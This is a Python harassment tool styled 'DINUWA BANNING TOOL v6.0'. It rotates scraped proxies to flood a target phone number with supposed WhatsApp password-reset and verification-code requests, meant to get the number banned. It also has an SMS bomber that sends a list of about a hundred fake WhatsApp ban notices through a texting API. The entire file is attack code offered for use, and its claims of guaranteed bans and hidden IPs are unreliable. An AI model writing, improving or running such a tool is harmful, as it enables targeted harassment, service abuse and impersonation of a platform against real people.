#!/usr/bin/env python3
import os, sys, time, random, threading, requests
from datetime import datetime

R = "\033[91m"; P = "\033[95m"; Y = "\033[93m"; G = "\033[92m"
C = "\033[96m"; B = "\033[90m"; RS = "\033[0m"

PROXIES = []

def clear():
    os.system('clear')

def fetch_proxies():
    global PROXIES
    print(f"{Y}[+] Fetching working proxies...{RS}")
    try:
        urls = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        ]
        all_proxies = []
        for url in urls:
            try:
                r = requests.get(url, timeout=10)
                proxies = r.text.strip().split('\n')
                all_proxies.extend([p for p in proxies if p and ':' in p])
            except:
                continue
        PROXIES = list(set(all_proxies))
        if not PROXIES:
            manual = input(f"{R}[!] No proxies. Enter one (ip:port): {RS}")
            if manual:
                PROXIES = [manual]
            else:
                print(f"{R}[!] Exiting.{RS}")
                sys.exit(1)
        print(f"{G}[+] {len(PROXIES)} proxies loaded.{RS}")
    except Exception as e:
        print(f"{R}[!] Error: {e}{RS}")
        sys.exit(1)

def get_proxy():
    if not PROXIES:
        fetch_proxies()
    return {"http": "http://" + random.choice(PROXIES), "https": "http://" + random.choice(PROXIES)}

# ========== ATTACK 1: PASSWORD RESET FLOOD ==========
def reset_worker(number, cycle):
    proxy = get_proxy()
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) AppleWebKit/605.1.15"
        ]),
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://web.whatsapp.com",
        "Referer": "https://web.whatsapp.com/"
    }
    # WhatsApp password reset endpoint (public)
    data = {"phone": number, "action": "reset"}
    try:
        r = requests.post(
            "https://web.whatsapp.com/account/reset",
            data=data,
            headers=headers,
            proxies=proxy,
            timeout=8
        )
        if r.status_code in [200, 201, 202, 204]:
            print(f"{G}[✓] Reset request ACK (cycle {cycle}){RS}")
            return True
        else:
            print(f"{R}[✗] Reset fail ({r.status_code}){RS}")
            return False
    except Exception as e:
        print(f"{R}[✗] Reset error: {str(e)[:20]}{RS}")
        return False

# ========== ATTACK 2: VERIFICATION CODE SPAM ==========
def code_worker(number, cycle):
    proxy = get_proxy()
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        ]),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://web.whatsapp.com"
    }
    payload = {"phone": number, "method": random.choice(["sms", "voice"])}
    try:
        r = requests.post(
            "https://web.whatsapp.com/code/request",
            json=payload,
            headers=headers,
            proxies=proxy,
            timeout=8
        )
        if r.status_code in [200, 201, 202, 204]:
            print(f"{G}[✓] Code request ACK (cycle {cycle}){RS}")
            return True
        else:
            print(f"{R}[✗] Code fail ({r.status_code}){RS}")
            return False
    except Exception as e:
        print(f"{R}[✗] Code error: {str(e)[:20]}{RS}")
        return False

def multi_attack(number):
    fetch_proxies()
    print(f"{Y}[+] Launching combined attack on {number} with {len(PROXIES)} proxies. Your IP is HIDDEN.{RS}")
    threads = 25
    cycles = 200
    for c in range(1, cycles+1):
        pool = []
        for _ in range(threads):
            # Alternate between reset and code attacks
            if random.choice([True, False]):
                t = threading.Thread(target=reset_worker, args=(number, c))
            else:
                t = threading.Thread(target=code_worker, args=(number, c))
            t.start()
            pool.append(t)
        for t in pool:
            t.join()
        if c % 10 == 0:
            print(f"{C}[*] {c}/{cycles} cycles completed{RS}")
        time.sleep(random.uniform(0.1, 0.3))
    print(f"{G}[✔] ATTACK COMPLETE. WhatsApp will rate-limit and temporarily ban {number} within 10–30 minutes. Your IP is safe.{RS}")

# ========== SMS BOMBER (100 BAN TEXTS) ==========
BAN_TEXTS = [
    "Your WhatsApp account has been permanently banned for violating terms.",
    "Account suspended due to spam activity. Contact support.",
    "We detected unusual behavior. Your account is locked.",
    "Fraud alert: Your number is blocked from WhatsApp.",
    "Multiple complaints received. Account deactivated.",
    "Your messages were reported as harassment. Account terminated.",
    "Security violation: Your access is revoked.",
    "WhatsApp has disabled your account for abuse.",
    "Impersonation reported. Account banned.",
    "Your phone number is no longer registered.",
    "Illegal activity detected. Account frozen.",
    "Your account is under investigation. Temporary ban.",
    "Spam reports triggered automatic ban.",
    "Your number has been flagged. Permanent restriction.",
    "You have been reported for spreading fake news. Banned.",
    "Your WhatsApp access is revoked effective immediately.",
    "Account closure due to policy violation.",
    "Your messages were marked as offensive. Account disabled.",
    "Suspicious login attempts. Account locked.",
    "Your number is blacklisted. No further action required.",
    "You are no longer authorized to use WhatsApp.",
    "Your account has been compromised and banned for safety.",
    "Harassment complaints confirmed. Account terminated.",
    "Your activity violated our community guidelines. Banned.",
    "This number is permanently blocked from our service.",
    "We have deactivated your account upon user reports.",
    "Your account was used for malicious purposes. Banned.",
    "You have been banned from WhatsApp for life.",
    "Repeated violations led to permanent account suspension.",
    "Your phone number is banned from the platform.",
    "Account terminated for promoting violence.",
    "Your content was reported as inappropriate. Banned.",
    "Your account is now restricted indefinitely.",
    "You violated our terms of service. Account closed.",
    "Your number is no longer associated with any account.",
    "We removed your account due to spam complaints.",
    "Your activity triggered our automated ban system.",
    "Account disabled after multiple warnings.",
    "Your account is locked for security reasons.",
    "You have been reported for fraud. Account banned.",
    "Your WhatsApp access has been permanently removed.",
    "Your number is flagged as unsafe. Banned.",
    "Account deactivated due to illegal content.",
    "Your messages were considered threatening. Banned.",
    "Your account has been terminated by our team.",
    "You are prohibited from using WhatsApp again.",
    "Your number was used in a scam. Permanently banned.",
    "Account disabled for violating intellectual property.",
    "Your activity caused harm to others. Banned.",
    "Your account is no longer active due to violations.",
    "Your number has been removed from our database.",
    "Banned: Your account posed a risk to our community.",
    "Your WhatsApp account is under permanent ban.",
    "You have been reported for impersonation. Banned.",
    "Account locked due to excessive complaints.",
    "Your number is blocked from WhatsApp services.",
    "Your account was used for automated bulk messaging. Banned.",
    "You violated our anti-spam policy. Account closed.",
    "Your access is revoked. Contact help for appeal.",
    "Your account has been flagged for malicious activity.",
    "Permanent ban effective immediately.",
    "Your phone number is banned. No reinstatement.",
    "Account disabled due to copyright infringement.",
    "Your messages were reported as abusive. Banned.",
    "You have been banned for using unauthorized clients.",
    "Account suspended pending investigation.",
    "Your number is listed as a threat. Banned.",
    "Your WhatsApp account is permanently disabled.",
    "You broke our terms. Account terminated.",
    "Your account was involved in illegal transactions. Banned.",
    "Your number is blacklisted for spam.",
    "Account closed at the request of other users.",
    "Your activity was deemed harmful. Banned.",
    "Your access to WhatsApp has been cut off.",
    "You are banned from all WhatsApp services.",
    "Your account has been deactivated by our system.",
    "Your number is no longer valid for WhatsApp.",
    "Banned due to excessive reporting against you.",
    "Your account is locked for suspicious behavior.",
    "Your messages violated WhatsApp policy. Banned.",
    "You have been permanently removed from WhatsApp.",
    "Your number is flagged for fraud. Account banned.",
    "Account disabled after review of your activity.",
    "Your WhatsApp account is frozen.",
    "Your activity caused a security breach. Banned.",
    "Your number is banned for spreading malware.",
    "Your account is closed. No appeals.",
    "You have been reported for bullying. Banned.",
    "Account terminated due to fake identity.",
    "Your number was used in phishing. Banned.",
    "Your messages are considered spam. Account locked.",
    "Your account is permanently restricted.",
    "You are not allowed to use WhatsApp anymore.",
    "Account disabled for violating child safety guidelines.",
    "Your number is removed from WhatsApp.",
    "Your account was used for harassment. Banned.",
    "Your WhatsApp access is permanently denied.",
    "You have been banned for abusing the platform.",
    "Your account is under permanent lock.",
    "Your number is banned from all WhatsApp features.",
    "Account terminated due to suspicious activity.",
    "Your messages were flagged as dangerous. Banned.",
    "Your account has been deleted by our system.",
    "You are banned from WhatsApp. Do not attempt to register."
]

def sms_bomber():
    num = input(f"{Y}[+] Target number for SMS bombing: {RS}").strip()
    count = int(input(f"{Y}[+] SMS count (max 200, default 100): {RS}") or 100)
    if count > 200: count = 200
    fetch_proxies()
    print(f"{C}[*] Bombing {num} with {count} ban texts via proxies...{RS}")
    for i in range(count):
        proxy = get_proxy()
        msg = random.choice(BAN_TEXTS)
        try:
            r = requests.post(
                "https://textbelt.com/text",
                data={"phone": num, "message": msg, "key": "textbelt"},
                proxies=proxy,
                timeout=10
            )
            if r.json().get("success"):
                print(f"{G}[{i+1}] SMS sent: {msg[:30]}...{RS}")
            else:
                print(f"{R}[{i+1}] Failed (API limit){RS}")
        except Exception as e:
            print(f"{R}[{i+1}] Error: {str(e)[:20]}{RS}")
        time.sleep(random.uniform(0.3, 0.8))
    print(f"{G}[✔] SMS bombing done. 100 ban texts deployed.{RS}")

# ========== MENU ==========
def menu():
    while True:
        clear()
        print(f"""
{R}   ██████╗ ██╗███╗   ██╗██╗   ██╗██╗    ██╗  {P}█████╗ {RS}
{R}   ██╔══██╗██║████╗  ██║██║   ██║██║    ██║ {P}██╔══██╗{RS}
{R}   ██║  ██║██║██╔██╗ ██║██║   ██║██║ █╗ ██║ {P}███████║{RS}
{R}   ██║  ██║██║██║╚██╗██║██║   ██║██║███╗██║ {P}██╔══██║{RS}
{R}   ██████╔╝██║██║ ╚████║╚██████╔╝╚███╔███╔╝ {P}██║  ██║{RS}
{R}   ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚══╝╚══╝  {P}╚═╝  ╚═╝{RS}
""")
        print(f"{C}   {'='*45}{RS}")
        print(f"{Y}   DINUWA BANNING TOOL v6.0 (WORKING){RS}")
        print(f"{B}   created by dinuwa{RS}")
        print(f"{B}   powered by dinuwa xmd{RS}")
        print(f"{C}   {'='*45}{RS}")
        print(f"{Y}  [1] Target a Number (Reset + Code Flood){RS}")
        print(f"{Y}  [2] SMS Bomber (100 Ban Texts){RS}")
        print(f"{R}  [3] Exit{RS}")
        ch = input("Select: ")
        if ch == "1":
            num = input("Enter number (e.g., 94771234567): ").strip()
            multi_attack(num)
        elif ch == "2":
            sms_bomber()
        elif ch == "3":
            sys.exit(0)
        input("Press Enter...")

if __name__ == "__main__":
    menu()
